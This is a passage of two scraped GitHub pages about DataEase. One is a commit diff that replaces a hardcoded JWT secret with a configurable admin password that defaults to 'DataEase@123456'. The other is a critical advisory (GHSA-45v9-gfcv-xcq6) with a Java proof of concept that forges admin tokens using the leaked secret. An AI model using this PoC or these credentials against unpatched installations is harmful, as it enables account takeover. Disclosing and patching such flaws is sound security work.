=== Content from github.com_26577e83_20250114_182114.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdataease%2Fdataease%2Fcommit%2Fe755248d59543bcd668ace495f293ff735fa82e9)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdataease%2Fdataease%2Fcommit%2Fe755248d59543bcd668ace495f293ff735fa82e9)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=dataease%2Fdataease)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dataease](/dataease)
/
**[dataease](/dataease/dataease)**
Public

* [Notifications](/login?return_to=%2Fdataease%2Fdataease) You must be signed in to change notification settings
* [Fork
  3.4k](/login?return_to=%2Fdataease%2Fdataease)
* [Star
   18.9k](/login?return_to=%2Fdataease%2Fdataease)

* [Code](/dataease/dataease)
* [Issues
  388](/dataease/dataease/issues)
* [Pull requests
  0](/dataease/dataease/pulls)
* [Actions](/dataease/dataease/actions)
* [Security](/dataease/dataease/security)
* [Insights](/dataease/dataease/pulse)

Additional navigation options

* [Code](/dataease/dataease)
* [Issues](/dataease/dataease/issues)
* [Pull requests](/dataease/dataease/pulls)
* [Actions](/dataease/dataease/actions)
* [Security](/dataease/dataease/security)
* [Insights](/dataease/dataease/pulse)

## Commit

[Permalink](/dataease/dataease/commit/e755248d59543bcd668ace495f293ff735fa82e9)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

perf: 社区版token机制

[Browse files](/dataease/dataease/tree/e755248d59543bcd668ace495f293ff735fa82e9)
Browse the repository at this point in the history

* Loading branch information

[![@fit2cloud-chenyw](https://avatars.githubusercontent.com/u/67260074?s=40&v=4)](/fit2cloud-chenyw)

[fit2cloud-chenyw](/dataease/dataease/commits?author=fit2cloud-chenyw "View all commits by fit2cloud-chenyw")
committed
Sep 29, 2024

1 parent
[276d504](/dataease/dataease/commit/276d5043dd469524bfae1fd07e62bd75136f448a)

commit e755248

 Show file tree

 Hide file tree

Showing
**5 changed files**
with
**169 additions**
and
**14 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* core/core-backend/src/main/java/io/dataease/substitute/permissions/login

  + core/core-backend/src/main/java/io/dataease/substitute/permissions/login/SubstituleLoginServer.java
    [SubstituleLoginServer.java](#diff-2d2c45ae536dc046124083af6912a19fd4dc9a5a65a356366bf87c8d59b7d2e8)
* de-xpack
  [de-xpack](#diff-b4dad4eea458c0d963cadd719959bd550187c74285e1f1568ab8ec14e13dc79f)
* sdk/common/src/main/java/io/dataease

  + auth

    - config

      * sdk/common/src/main/java/io/dataease/auth/config/SubstituleLoginConfig.java
        [SubstituleLoginConfig.java](#diff-7aef70ef5f45d094657c945c3dee82781754a8432b17c08363dcd030518fc71b)
    - filter

      * sdk/common/src/main/java/io/dataease/auth/filter/TokenFilter.java
        [TokenFilter.java](#diff-bf6dc4aa509902feeb39c1fe8ed7e6f604c77b1f7cb842c51ea46f95d6d97792)
  + utils

    - sdk/common/src/main/java/io/dataease/utils/TokenUtils.java
      [TokenUtils.java](#diff-eee25d8dac9b0aaddc29d48a8cf78df569c1c7d0ce4e4e31e658009abecb35bc)

## There are no files selected for viewing

30 changes: 24 additions & 6 deletions

30
[...backend/src/main/java/io/dataease/substitute/permissions/login/SubstituleLoginServer.java](#diff-2d2c45ae536dc046124083af6912a19fd4dc9a5a65a356366bf87c8d59b7d2e8 "core/core-backend/src/main/java/io/dataease/substitute/permissions/login/SubstituleLoginServer.java")

Show comments

[View file](/dataease/dataease/blob/e755248d59543bcd668ace495f293ff735fa82e9/core/core-backend/src/main/java/io/dataease/substitute/permissions/login/SubstituleLoginServer.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -5,14 +5,17 @@ |
|  |  | import com.auth0.jwt.algorithms.Algorithm; |
|  |  | import io.dataease.api.permissions.login.dto.PwdLoginDTO; |
|  |  | import io.dataease.auth.bo.TokenUserBO; |
|  |  | import io.dataease.auth.config.SubstituleLoginConfig; |
|  |  | import io.dataease.auth.vo.TokenVO; |
|  |  | import io.dataease.exception.DEException; |
|  |  | import io.dataease.i18n.Translator; |
|  |  | import io.dataease.utils.LogUtil; |
|  |  | import io.dataease.utils.Md5Utils; |
|  |  | import io.dataease.utils.RsaUtils; |
|  |  | import org.apache.commons.lang3.StringUtils; |
|  |  | import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean; |
|  |  | import org.springframework.stereotype.Component; |
|  |  | import org.springframework.web.bind.annotation.GetMapping; |
|  |  | import org.springframework.web.bind.annotation.PostMapping; |
|  |  | import org.springframework.web.bind.annotation.RequestMapping; |
|  |  | import org.springframework.web.bind.annotation.RestController; |
|  |  | import org.springframework.web.bind.annotation.\*; |
|  |  |  |
|  |  | @Component |
|  |  | @ConditionalOnMissingBean(name = "loginServer") |
| Expand All | | @@ -21,11 +24,26 @@ |
|  |  | public class SubstituleLoginServer { |
|  |  |  |
|  |  | @PostMapping("/login/localLogin") |
|  |  | public TokenVO localLogin(PwdLoginDTO dto) { |
|  |  | public TokenVO localLogin(@RequestBody PwdLoginDTO dto) { |
|  |  |  |
|  |  | String name = dto.getName(); |
|  |  | name = RsaUtils.decryptStr(name); |
|  |  | String pwd = dto.getPwd(); |
|  |  | pwd = RsaUtils.decryptStr(pwd); |
|  |  |  |
|  |  | dto.setName(name); |
|  |  | dto.setPwd(pwd); |
|  |  |  |
|  |  | if (!StringUtils.equals("admin", name)) { |
|  |  | DEException.throwException("仅admin账号可用"); |
|  |  | } |
|  |  | if (!StringUtils.equals(pwd, SubstituleLoginConfig.getPwd())) { |
|  |  | DEException.throwException(Translator.get("i18n\_login\_name\_pwd\_err")); |
|  |  | } |
|  |  | TokenUserBO tokenUserBO = new TokenUserBO(); |
|  |  | tokenUserBO.setUserId(1L); |
|  |  | tokenUserBO.setDefaultOid(1L); |
|  |  | String md5Pwd = "83d923c9f1d8fcaa46cae0ed2aaa81b5"; |
|  |  | String md5Pwd = Md5Utils.md5(pwd); |
|  |  | return generate(tokenUserBO, md5Pwd); |
|  |  | } |
|  |  |  |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[de-xpack](#diff-b4dad4eea458c0d963cadd719959bd550187c74285e1f1568ab8ec14e13dc79f "de-xpack")

Show comments

Submodule [de-xpack](https://github.com/dataease/de-xpack)
updated
[from f028be to 1aae01](/dataease/de-xpack/compare/f028be49a62cb21a53c11fa4f931946417381a55...1aae01674cc0dd042bbb5eac7f1cc54f30b9d23d)

71 changes: 71 additions & 0 deletions

71
[sdk/common/src/main/java/io/dataease/auth/config/SubstituleLoginConfig.java](#diff-7aef70ef5f45d094657c945c3dee82781754a8432b17c08363dcd030518fc71b "sdk/common/src/main/java/io/dataease/auth/config/SubstituleLoginConfig.java")

Show comments

[View file](/dataease/dataease/blob/e755248d59543bcd668ace495f293ff735fa82e9/sdk/common/src/main/java/io/dataease/auth/config/SubstituleLoginConfig.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,71 @@ |
|  |  | package io.dataease.auth.config; |
|  |  |  |
|  |  | import com.fasterxml.jackson.databind.ObjectMapper; |
|  |  | import io.dataease.utils.CommonBeanFactory; |
|  |  | import io.dataease.utils.LogUtil; |
|  |  | import org.apache.commons.lang3.ObjectUtils; |
|  |  | import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean; |
|  |  | import org.springframework.context.annotation.Bean; |
|  |  | import org.springframework.context.annotation.Configuration; |
|  |  | import org.springframework.core.env.Environment; |
|  |  | import org.springframework.core.io.ResourceLoader; |
|  |  |  |
|  |  | import java.io.File; |
|  |  | import java.io.FileOutputStream; |
|  |  | import java.io.IOException; |
|  |  | import java.util.HashMap; |
|  |  | import java.util.Map; |
|  |  |  |
|  |  | @ConditionalOnMissingBean(name = "loginServer") |
|  |  | @Configuration |
|  |  | public class SubstituleLoginConfig { |
|  |  |  |
|  |  |  |
|  |  | private static String jsonFilePath = "classpath:substitule.json"; |
|  |  |  |
|  |  | private static String pwd; |
|  |  |  |
|  |  | private static boolean ready = false; |
|  |  |  |
|  |  |  |
|  |  | @ConditionalOnMissingBean(name = "loginServer") |
|  |  | @Bean |
|  |  | public Map<String, Object> substituleLoginData(ResourceLoader resourceLoader) throws IOException { |
|  |  | ObjectMapper objectMapper = new ObjectMapper(); |
|  |  | File jsonFile = new File(jsonFilePath); |
|  |  | if (!jsonFile.exists()) { |
|  |  | pwd = CommonBeanFactory.getBean(Environment.class).getProperty("dataease.default-pwd", "DataEase@123456"); |
|  |  | modifyPwd(pwd); |
|  |  | } |
|  |  | return objectMapper.readValue(jsonFile, Map.class); |
|  |  | } |
|  |  |  |
|  |  | public static String getPwd() { |
|  |  | if (!ready) { |
|  |  | ready = true; |
|  |  | Object substituleLoginDataObject = CommonBeanFactory.getBean("substituleLoginData"); |
|  |  | if (substituleLoginDataObject != null) { |
|  |  | Map<String, Object> substituleLoginData = (Map<String, Object>) substituleLoginDataObject; |
|  |  | if (ObjectUtils.isNotEmpty(substituleLoginData.get("pwd"))) { |
|  |  | pwd = substituleLoginData.get("pwd").toString(); |
|  |  | return substituleLoginData.get("pwd").toString(); |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  | return pwd; |
|  |  | } |
|  |  |  |
|  |  | public static void modifyPwd(String pwd) { |
|  |  | File file = new File(jsonFilePath); |
|  |  | Map<String, String> myObject = new HashMap<>(); |
|  |  | myObject.put("pwd", pwd); |
|  |  | SubstituleLoginConfig.pwd = pwd; |
|  |  | ObjectMapper mapper = new ObjectMapper(); |
|  |  | try (FileOutputStream fos = new FileOutputStream(file)) { |
|  |  | // 将对象写入文件 |
|  |  | mapper.writeValue(fos, myObject); |
|  |  | } catch (IOException e) { |
|  |  | LogUtil.error(e.getCause(), new Throwable(e)); |
|  |  | } |
|  |  | } |
|  |  | } |

46 changes: 40 additions & 6 deletions

46
[sdk/common/src/main/java/io/dataease/auth/filter/TokenFilter.java](#diff-bf6dc4aa509902feeb39c1fe8ed7e6f604c77b1f7cb842c51ea46f95d6d97792 "sdk/common/src/main/java/io/dataease/auth/filter/TokenFilter.java")

Show comments

[View file](/dataease/dataease/blob/e755248d59543bcd668ace495f293ff735fa82e9/sdk/common/src/main/java/io/dataease/auth/filter/TokenFilter.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -6,13 +6,22 @@ |
|  |  | import jakarta.servlet.FilterConfig; |
|  |  | import jakarta.servlet.\*; |
|  |  | import jakarta.servlet.http.HttpServletRequest; |
|  |  | import jakarta.servlet.http.HttpServletResponse; |
|  |  | import org.apache.commons.lang3.StringUtils; |
|  |  | import org.springframework.http.HttpHeaders; |
|  |  | import org.springframework.http.HttpStatus; |
|  |  | import org.springframework.http.HttpStatusCode; |
|  |  | import org.springframework.http.ResponseEntity; |
|  |  |  |
|  |  | import java.io.IOException; |
|  |  | import java.net.URLEncoder; |
|  |  | import java.nio.charset.StandardCharsets; |
|  |  | import java.util.Objects; |
|  |  |  |
|  |  | public class TokenFilter implements Filter { |
|  |  |  |
|  |  | private static final String headName = "DE-GATEWAY-FLAG"; |
|  |  |  |
|  |  | @Override |
|  |  | public void init(FilterConfig filterConfig) throws ServletException { |
|  |  | } |
| Expand All | | @@ -36,10 +45,6 @@ public void doFilter(ServletRequest servletRequest, ServletResponse servletRespo |
|  |  | filterChain.doFilter(servletRequest, servletResponse); |
|  |  | return; |
|  |  | } |
|  |  | /\*String refreshToken = null; |
|  |  | if (StringUtils.isNotBlank(refreshToken = ServletUtils.request().getHeader(AuthConstant.REFRESH\_TOKEN\_KEY))) { |
|  |  | ServletUtils.response().addHeader(AuthConstant.REFRESH\_TOKEN\_KEY, refreshToken); |
|  |  | }\*/ |
|  |  | String executeVersion = null; |
|  |  | if (StringUtils.isNotBlank(executeVersion = VersionUtil.getRandomVersion())) { |
|  |  | Objects.requireNonNull(ServletUtils.response()).addHeader(AuthConstant.DE\_EXECUTE\_VERSION, executeVersion); |
| Expand All | | @@ -52,12 +57,41 @@ public void doFilter(ServletRequest servletRequest, ServletResponse servletRespo |
|  |  | return; |
|  |  | } |
|  |  | String token = ServletUtils.getToken(); |
|  |  | TokenUserBO userBO = TokenUtils.validate(token); |
|  |  | UserUtils.setUserInfo(userBO); |
|  |  | TokenUserBO userBO = null; |
|  |  | try { |
|  |  | userBO = TokenUtils.validate(token); |
|  |  | UserUtils.setUserInfo(userBO); |
|  |  | } catch (Exception e) { |
|  |  | HttpServletResponse res = (HttpServletResponse) servletResponse; |
|  |  | LogUtil.error(e.getMessage(), e); |
|  |  | HttpHeaders headers = new HttpHeaders(); |
|  |  | String msg = URLEncoder.encode(e.getMessage(), StandardCharsets.UTF\_8).replace("+", "%20"); |
|  |  | headers.add(headName, msg); |
|  |  | sendResponseEntity(res, new ResponseEntity<>(e.getMessage(), headers, HttpStatus.UNAUTHORIZED)); |
|  |  | return; |
|  |  | } |
|  |  | filterChain.doFilter(servletRequest, servletResponse); |
|  |  | } |
|  |  |  |
|  |  | @Override |
|  |  | public void destroy() { |
|  |  | } |
|  |  |  |
|  |  | private void sendResponseEntity(HttpServletResponse httpResponse, ResponseEntity<String> responseEntity) throws IOException { |
|  |  | HttpHeaders headers = responseEntity.getHeaders(); |
|  |  | HttpStatusCode statusCode = responseEntity.getStatusCode(); |
|  |  |  |
|  |  | // 设置状态码 |
|  |  | httpResponse.setStatus(statusCode.value()); |
|  |  |  |
|  |  | // 设置响应头 |
|  |  | if (headers != null) { |
|  |  | for (String name : headers.keySet()) { |
|  |  | httpResponse.setHeader(name, headers.getFirst(name)); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | // 设置响应体 |
|  |  | httpResponse.getWriter().write(responseEntity.getBody()); |
|  |  | } |
|  |  | } |

34 changes: 33 additions & 1 deletion

34
[sdk/common/src/main/java/io/dataease/utils/TokenUtils.java](#diff-eee25d8dac9b0aaddc29d48a8cf78df569c1c7d0ce4e4e31e658009abecb35bc "sdk/common/src/main/java/io/dataease/utils/TokenUtils.java")

Show comments

[View file](/dataease/dataease/blob/e755248d59543bcd668ace495f293ff735fa82e9/sdk/common/src/main/java/io/dataease/utils/TokenUtils.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,11 +1,19 @@ |
|  |  | package io.dataease.utils; |
|  |  |  |
|  |  | import com.auth0.jwt.JWT; |
|  |  | import com.auth0.jwt.JWTVerifier; |
|  |  | import com.auth0.jwt.algorithms.Algorithm; |
|  |  | import com.auth0.jwt.interfaces.DecodedJWT; |
|  |  | import com.auth0.jwt.interfaces.Verification; |
|  |  | import io.dataease.auth.bo.TokenUserBO; |
|  |  | import io.dataease.auth.config.SubstituleLoginConfig; |
|  |  | import io.dataease.exception.DEException; |
|  |  | import io.dataease.license.utils.LicenseUtil; |
|  |  | import org.apache.commons.lang3.ObjectUtils; |
|  |  | import org.apache.commons.lang3.StringUtils; |
|  |  | import org.springframework.util.ReflectionUtils; |
|  |  |  |
|  |  | import java.lang.reflect.Method; |
|  |  |  |
|  |  | public class TokenUtils { |
|  |  |  |
| Expand All | | @@ -28,9 +36,33 @@ public static TokenUserBO validate(String token) { |
|  |  | if (StringUtils.length(token) < 100) { |
|  |  | DEException.throwException("token is invalid"); |
|  |  | } |
|  |  | return userBOByToken(token); |
|  |  | TokenUserBO userBO = userBOByToken(token); |
|  |  | if (ObjectUtils.isEmpty(userBO) || LicenseUtil.licenseValid()) { |
|  |  | return userBO; |
|  |  | } |
|  |  | Long userId = userBO.getUserId(); |
|  |  | String secret = null; |
|  |  | if (ObjectUtils.isEmpty(CommonBeanFactory.getBean("loginServer"))) { |
|  |  | String pwd = SubstituleLoginConfig.getPwd(); |
|  |  | secret = Md5Utils.md5(pwd); |
|  |  | } else { |
|  |  | Object apisixTokenManage = CommonBeanFactory.getBean("apisixTokenManage"); |
|  |  | Method method = DeReflectUtil.findMethod(apisixTokenManage.getClass(), "userCacheBO"); |
|  |  | Object o = ReflectionUtils.invokeMethod(method, apisixTokenManage, userId); |
|  |  | Method pwdMethod = DeReflectUtil.findMethod(o.getClass(), "getPwd"); |
|  |  | Object pwdObj = ReflectionUtils.invokeMethod(pwdMethod, o); |
|  |  | secret = pwdObj.toString(); |
|  |  | } |
|  |  | Algorithm algorithm = Algorithm.HMAC256(secret); |
|  |  | Verification verification = JWT.require(algorithm).withClaim("uid", userId).withClaim("oid", userBO.getDefaultOid()); |
|  |  | JWTVerifier verifier = verification.build(); |
|  |  | DecodedJWT decode = JWT.decode(token); |
|  |  | algorithm.verify(decode); |
|  |  | verifier.verify(token); |
|  |  | return userBO; |
|  |  | } |
|  |  |  |
|  |  |  |
|  |  | public static TokenUserBO validateLinkToken(String linkToken) { |
|  |  | if (StringUtils.isBlank(linkToken)) { |
|  |  | String uri = ServletUtils.request().getRequestURI(); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `e755248`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdataease%2Fdataease%2Fcommit%2Fe755248d59543bcd668ace495f293ff735fa82e9) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_86ec90a2_20250114_182117.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdataease%2Fdataease%2Fsecurity%2Fadvisories%2FGHSA-45v9-gfcv-xcq6)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdataease%2Fdataease%2Fsecurity%2Fadvisories%2FGHSA-45v9-gfcv-xcq6)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=dataease%2Fdataease)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dataease](/dataease)
/
**[dataease](/dataease/dataease)**
Public

* [Notifications](/login?return_to=%2Fdataease%2Fdataease) You must be signed in to change notification settings
* [Fork
  3.4k](/login?return_to=%2Fdataease%2Fdataease)
* [Star
   18.9k](/login?return_to=%2Fdataease%2Fdataease)

* [Code](/dataease/dataease)
* [Issues
  388](/dataease/dataease/issues)
* [Pull requests
  0](/dataease/dataease/pulls)
* [Actions](/dataease/dataease/actions)
* [Security](/dataease/dataease/security)
* [Insights](/dataease/dataease/pulse)

Additional navigation options

* [Code](/dataease/dataease)
* [Issues](/dataease/dataease/issues)
* [Pull requests](/dataease/dataease/pulls)
* [Actions](/dataease/dataease/actions)
* [Security](/dataease/dataease/security)
* [Insights](/dataease/dataease/pulse)

# DataEase has a forged JWT token vulnerability

Critical

[fit2cloudrd](/fit2cloudrd)
published
GHSA-45v9-gfcv-xcq6
Nov 13, 2024

## Package

maven

io.dataease
([Maven](/advisories?query=ecosystem%3Amaven))

## Affected versions

<= 2.10.1

## Patched versions

2.10.2

## Description

### Impact

Attackers can forge jwt and take over services.

Code Analysis:

io.dataease.substitute.permissions.login.SubstituleLoginServer

```
public class SubstituleLoginServer {

    @PostMapping("/login/localLogin")
    public TokenVO localLogin(PwdLoginDTO dto) {
        TokenUserBO tokenUserBO = new TokenUserBO();
        tokenUserBO.setUserId(1L);
        tokenUserBO.setDefaultOid(1L);
        String md5Pwd = "83d923c9f1d8fcaa46cae0ed2aaa81b5";
        return generate(tokenUserBO, md5Pwd);
    }

    @GetMapping("/logout")
    public void logout() {
        LogUtil.info("substitule logout");
    }

    private TokenVO generate(TokenUserBO bo, String secret) {
        Algorithm algorithm = Algorithm.HMAC256(secret);
        Long userId = bo.getUserId();
        Long defaultOid = bo.getDefaultOid();
        JWTCreator.Builder builder = JWT.create();
        builder.withClaim("uid", userId).withClaim("oid", defaultOid);
        String token = builder.sign(algorithm);
        return new TokenVO(token, 0L);
    }
}
```

Here, the JWT secret is hardcoded in the code, and the UID and OID are hardcoded. This means that attackers can forge JWT and take over the service.

POC:

```
package io.dataease;
import com.auth0.jwt.JWT;
import com.auth0.jwt.JWTCreator;
import com.auth0.jwt.algorithms.Algorithm;
import io.dataease.api.permissions.login.api.LoginApi;
import io.dataease.auth.vo.TokenVO;
public class jwt {
    public static void main(String[] args) {
        // 设置密钥
        String secret = "83d923c9f1d8fcaa46cae0ed2aaa81b5";
        Algorithm algorithm = Algorithm.HMAC256(secret);
        // 设置⽤户ID和默认OID
        Long userId = 1 L;
        Long defaultOid = 1 L;
        // 创建 JWT 构建器并添加声明
        JWTCreator.Builder builder = JWT.create();
        builder.withClaim("uid", 1).withClaim("oid", 1).withClaim("exp", 99999999999 L);
        // ⽣成 JWT
        String token = builder.sign(algorithm);
        // 输出⽣成的 JWT
        System.out.println("X-DE-TOKEN: " + token);
    }
}
```

[![image](https://private-user-images.githubusercontent.com/985347/385228002-b2247554-2ea1-4dc0-8540-c264f38834c8.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4NzkxNzQsIm5iZiI6MTczNjg3ODg3NCwicGF0aCI6Ii85ODUzNDcvMzg1MjI4MDAyLWIyMjQ3NTU0LTJlYTEtNGRjMC04NTQwLWMyNjRmMzg4MzRjOC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQxODIxMTRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1hNzk4YWM1ODI0OTdjYmJhZThkNDhhZmE3YmQyZWE1M2U3ODZmYWY2Nzk5OTU1MDg0YjYxODc2MzQzMjA4YzRmJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.x4__sKBM5e2FPAHdPXjHbEvFPwoj1nyDOYNs4dnWZzs)](https://private-user-images.githubusercontent.com/985347/385228002-b2247554-2ea1-4dc0-8540-c264f38834c8.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50L